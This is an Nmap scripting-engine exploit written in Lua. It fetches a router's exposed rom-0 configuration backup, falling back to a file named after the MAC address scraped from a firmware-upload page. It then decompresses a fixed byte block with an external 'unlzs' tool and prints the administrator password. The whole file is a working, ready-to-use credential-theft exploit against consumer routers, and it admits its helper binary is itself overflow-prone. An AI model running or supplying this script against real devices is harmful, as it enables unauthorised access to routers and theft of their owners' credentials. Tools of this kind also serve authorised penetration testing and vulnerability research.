local string = require "string"
local shortport = require "shortport"
local http = require "http"

description = [[
rom-0 uncompress exploit
]]
author = "Cesar Neira"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit", "intrusive"}

---
--
-- @usage --script rom0x.nse -p 80 192.168.1.1
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | rom0x:
-- |_  password: 1234
--
---

--[[
The source code of the program can be obtained at the following URL:
https://github.com/alguien-gh/scripts/blob/master/exploits/rom0x/unlzs.c

** WARNING **
"unlzs" is vulnerable to overflow. This script uses "unlzs" to uncompress
the rom-0 file. Use this script at your own risk.
]]
local UNLZS_CMD_PATH = "./unlzs"

portrule = shortport.http

uncompress_rom0 = function(rom0content)
  local fname = os.tmpname()
  local fdesc = io.open(fname, 'w')
  local pass = nil
  if fdesc ~= nil then
    local data = string.sub(rom0content, 8569, 8788) -- block containing password
    fdesc:write(data)
    fdesc:close()
    local cmd = UNLZS_CMD_PATH .. " " .. fname .. " | strings | head -n 1"
    fdesc = io.popen(cmd, 'r')
    if fdesc ~= nil then
      pass = fdesc:read("*a");
      pass = string.sub(pass, 1, -2) -- remove end-line character
      fdesc:close()
    end
    os.remove(fname)
  end
  return pass
end

get_romfile = function(host, port, path)
  local options = {}
  options.timeout = 5000 -- 5s
  local resp = http.get(host, port, path, options)
  if resp and resp.status == 200 and
    resp.header['content-type'] == "application/octet-stream"
  then
    return resp.body
  end
  return nil
end

try_get_macaddr = function(host, port)
  local options = {}
  options.timeout = 5000 -- 5s
  local resp = http.get(host, port, "/rpFWUpload.html", options)
  if resp and resp.status == 200 and resp.body then
    local mac = string.match(resp.body,"objStr%.search%(/([0-9A-F]+)$/")
    if mac and string.len(mac) == 12 then
      return mac
    end
  end
  return nil
end

action = function(host, port)
  local output = nil
  local rom0content = get_romfile(host, port, "/rom-0")
  if rom0content == nil then
    local mac = try_get_macaddr(host, port)
    if mac ~= nil then
      rom0content = get_romfile(host, port, "/" .. mac)
    end
  end
  if rom0content ~= nil then
    output = {}
    output.password = uncompress_rom0(rom0content)
  end
  return output
end

